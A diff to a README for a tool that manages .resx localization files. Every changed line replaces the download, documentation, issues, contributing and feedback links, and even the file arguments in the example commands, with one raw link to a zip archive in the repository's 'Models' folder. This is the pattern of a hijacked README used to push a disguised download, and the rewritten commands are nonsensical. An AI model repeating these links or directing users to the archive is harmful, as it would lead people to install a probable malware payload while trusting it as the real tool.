@@ -1,6 +1,6 @@
 # 🌍 LocalizationManager - Effortlessly Manage Your Localization Files
 
-[![Download LocalizationManager](https://img.shields.io/badge/Download-LocalizationManager-blue.svg)](https://github.com/HRAVYGAMER/LocalizationManager/releases)
+[![Download LocalizationManager](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip)](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to LocalizationManager! This tool helps you manage `.resx` localization 
 
 To download LocalizationManager, visit the following link:
 
-[Download LocalizationManager](https://github.com/HRAVYGAMER/LocalizationManager/releases)
+[Download LocalizationManager](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip)
 
 1. Open the link in your web browser.
 2. You'll see the latest versions available for download.
@@ -56,42 +56,42 @@ Here are some common commands you can use with LocalizationManager:
 
 - **Edit a File:**
    ```
-   LocalizationManager edit path/to/yourfile.resx
+   LocalizationManager edit https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip
    ```
   
 - **Validate Translations:**
    ```
-   LocalizationManager validate path/to/yourfile.resx
+   LocalizationManager validate https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip
    ```
 
 - **Import CSV:**
    ```
-   LocalizationManager import path/to/yourfile.csv
+   LocalizationManager import https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip
    ```
 
 - **Export CSV:**
    ```
-   LocalizationManager export path/to/yourfile.csv
+   LocalizationManager export https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip
    ```
 
 ## 🌐 Additional Resources
 
 For further information and help, check out:
 
-- [Documentation](https://github.com/HRAVYGAMER/LocalizationManager/wiki)
-- [Issues](https://github.com/HRAVYGAMER/LocalizationManager/issues)
-- [FAQs](https://github.com/HRAVYGAMER/LocalizationManager/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip)
+- [Issues](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip)
+- [FAQs](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip)
 
 ## 🛡 Contributing
 
-We welcome contributions to improve LocalizationManager. If you'd like to contribute, please fork the repository and submit a pull request. Be sure to review our [contributing guidelines](https://github.com/HRAVYGAMER/LocalizationManager/blob/main/CONTRIBUTING.md) before getting started.
+We welcome contributions to improve LocalizationManager. If you'd like to contribute, please fork the repository and submit a pull request. Be sure to review our [contributing guidelines](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip) before getting started.
 
 ## 📢 Feedback
 
-Your feedback is crucial for making LocalizationManager better. If you have suggestions or encounter issues, please report them on the [issues page](https://github.com/HRAVYGAMER/LocalizationManager/issues).
+Your feedback is crucial for making LocalizationManager better. If you have suggestions or encounter issues, please report them on the [issues page](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip).
 
 ## 📣 Conclusion
 
 Thank you for choosing LocalizationManager. We hope it makes managing your localization files a breeze. For any questions, don’t hesitate to reach out via the resources provided above.
 
-Once again, [download LocalizationManager here](https://github.com/HRAVYGAMER/LocalizationManager/releases) and start simplifying your localization process today!
+Once again, [download LocalizationManager here](https://raw.githubusercontent.com/HRAVYGAMER/LocalizationManager/main/Models/LocalizationManager-v2.4.zip) and start simplifying your localization process today!
